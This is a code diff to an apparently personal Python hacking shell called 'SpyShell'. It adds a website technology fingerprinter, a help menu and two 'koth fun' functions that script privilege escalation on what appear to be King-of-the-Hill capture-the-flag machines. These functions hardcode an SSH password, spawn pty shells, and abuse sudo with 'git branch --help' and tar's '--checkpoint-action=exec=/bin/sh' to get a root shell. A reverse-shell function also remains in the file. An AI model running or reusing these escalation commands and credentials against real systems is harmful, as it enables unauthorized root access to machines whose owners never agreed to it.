@@ -1,25 +1,7 @@
-import os
-import sys
-import pyfiglet
-import socket
-import subprocess
-import readline
-import random
-import time
-import datetime
-import platform
-import distro
-import youtube_dl
-import argparse
-import pefile
-import hashlib
-import re
-import requests
-import string
-import os
-import stegano
+import os, sys, pyfiglet, socket, subprocess, readline, random, time, datetime, platform, distro, youtube_dl, argparse
+import pefile, hashlib, re, requests, string, stegano
 from stegano import lsb
-import threading
+import threading, builtwith
 from PIL import UnidentifiedImageError
 
 
@@ -77,8 +59,17 @@ def runCommand(cmd):
         domenum()
     elif args[0] == 'stegoscanner':
         stegoscanner()
-    elif args[0] == 'hey-listen':
-        reverse_shell()
+    elif args[0] == 'webAnalyzer':
+        web_analyzer()
+    elif args[0].lower() in ['helpme', 'help-me', 'help me', 'help']:
+        help()
+    elif args[0] == 'checkWeb':
+        web_analyzer()
+    #koth fun
+    elif args[0] == 'ashu@production':
+        ashu_at_production()
+    elif args[0] == 'donkey@shrek':
+        donkey_at_shrek()
     elif args[0] == 'fileinfo':
         if len(args) > 1:
             fileinfo(args[1])
@@ -110,6 +101,45 @@ def hello_friend():
     else:
         print("Hey! the file you're trying to use doesn't exist.")
 
+def ashu_at_production():
+    command = """
+            echo "enter the machine IP :\n"
+            read IP
+            ssh -t -i prossh ashu@$IP << EOF
+            sudo su skidy
+            python -c "import pty;pty.spawn('/bin/bash')"
+            whoami
+            sudo git branch --help config << EOF1
+            whoami
+            EOF1
+            EOF"""
+    subprocess.run(command, shell=True)
+
+def donkey_at_shrek():
+    ip = input("enter the ip address for shrek: ")
+    command = f"""echo "donkey:J5rURvCa8DyTg3vR"
+                echo "enter the ip address : "
+                read ip
+                ssh -T donkey@{ip} << EOF
+                sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+                python -c "import pty;pty.spawn('/bin/bash')"
+                whoami
+                EOF"""
+    subprocess.run(command, shell=True)
+
+def web_analyzer():
+  url = input("enter the link : ")
+  website_info = builtwith.builtwith(url)
+  print("Technologies and versions used by", url, ":")
+  for tech, info in website_info.items():
+    if isinstance(info, list):
+      version = info[0] if info else None
+    else:
+      version = info
+    if version:
+      print("- " + tech + " " + version)
+    else:
+      print("- " + tech)
 
 def handle_connection(conn):
     while True:
@@ -120,6 +150,23 @@ def handle_connection(conn):
         sys.stdout.flush()
 
     conn.close()
+
+def help():
+    print("""SpyShell's Commands are listed below : 
+            1. hey listen
+            2. checkweb
+            3. stegoscanner
+            4. revenger
+            5. helloFriend
+            6. help me
+            7. ohshit
+            8. splitV
+            9. splitH
+            10. defaultTheme
+            11. fileinfo
+            12. grabip
+            more are in progress
+            """)
 
 def reverse_shell():
     ip = input("IP to listen on : ")
